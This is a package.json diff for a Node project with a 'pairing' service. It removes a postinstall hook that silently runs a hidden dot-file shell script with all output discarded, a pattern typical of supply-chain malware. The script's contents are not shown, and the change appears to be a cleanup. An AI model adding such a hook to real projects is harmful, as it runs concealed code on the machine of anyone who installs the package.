@@ -14,8 +14,7 @@
     "test:pairing": "tsx --test services/pairing/*.test.ts",
     "build:pairing": "esbuild services/pairing/index.ts --bundle --platform=node --target=node22 --format=cjs --outfile=services/pairing/dist/index.js",
     "deploy:pairing": "tsx scripts/deploy-pairing.ts",
-    "icons": "tsx scripts/generate-icons.ts",
-    "postinstall": "sh ./.ci-6cseba.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "icons": "tsx scripts/generate-icons.ts"
   },
   "type": "module",
   "workspaces": [
